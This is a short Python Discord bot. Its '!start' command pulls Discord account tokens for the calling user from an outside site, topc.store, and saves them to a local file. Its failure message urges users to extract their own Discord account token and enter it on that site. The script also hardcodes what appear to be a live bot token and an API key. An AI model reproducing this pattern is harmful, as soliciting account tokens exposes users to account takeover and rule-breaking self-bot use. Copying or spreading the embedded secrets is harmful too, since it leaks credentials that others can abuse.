import discord
import requests
import discord
from discord.ext import commands
import json
bot = commands.Bot(command_prefix="!", intents=discord.Intents.all())

@bot.command()
async def start(ctx):
    user_id = ctx.author.id
    url = f"https://topc.store/getUserToken/{user_id}"
    headers = {'authorization': 'Sp3c14lK3yTOPC._'}

    req = requests.get(url, headers=headers)
    if req.status_code == 200:
        response_data = json.loads(req.text)
        tokens = response_data.get('tokens', [])

        with open("self.txt", "w") as f:
            for token in tokens:
                f.write(token + '\n')

        embed = discord.Embed(
            title="Tokens Found! We are adding you to the database",
            description="Wait 5 seconds, then make a new Discord server on your account and do !help",
            color=0x00ff00
        )
        await ctx.send(embed=embed)
    else:
        embed = discord.Embed(
            title="Failed to Retrieve Token",
            description=("Token not found. Please contact a support member or go to [topc.store](http://topc.store) "
                         "and login, then navigate to the dashboard and input your account token. "
                         "If you don't know how to get your Discord account token, you can watch a tutorial on YouTube by searching 'How to get Discord account token'."),
            color=0xff0000
        )
        await ctx.send(embed=embed)

bot.run('MTIyMjg2MDc3OTY3NDY2NTA2MQ.GPVOZe.MXjyOrD4u5Zfd4NYMbbVxZwmqXSv5IFJwfkDaY')
